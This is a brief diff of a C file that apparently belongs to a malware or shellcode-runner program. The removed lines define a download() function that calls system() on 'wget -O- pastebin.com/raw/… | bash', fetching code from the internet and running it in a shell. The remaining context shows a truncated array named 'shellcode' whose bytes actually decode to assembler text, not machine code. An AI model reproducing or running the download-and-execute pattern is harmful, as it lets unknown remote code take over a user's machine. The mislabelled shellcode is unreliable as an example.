@@ -6,12 +6,6 @@
 
 #define MAX_CMN_LEN 100
 
-int download () {
-    char wget[MAX_CMN_LEN] = "wget -O-  pastebin.com/raw/3LGCFWc6 | bash", **p; /* defining the command to execute */
-    system(wget); /* executing wget */
-    return 0; /* return */
-}
-
 char shellcode[] =
 	"\x09\x2e\x73\x65\x63\x74\x69\x6f\x6e\x09\x5f\x5f\x54\x45\x58"
 	"\x54\x2c\x5f\x5f\x74\x65\x78\x74\x2c\x72\x65\x67\x75\x6c\x61"
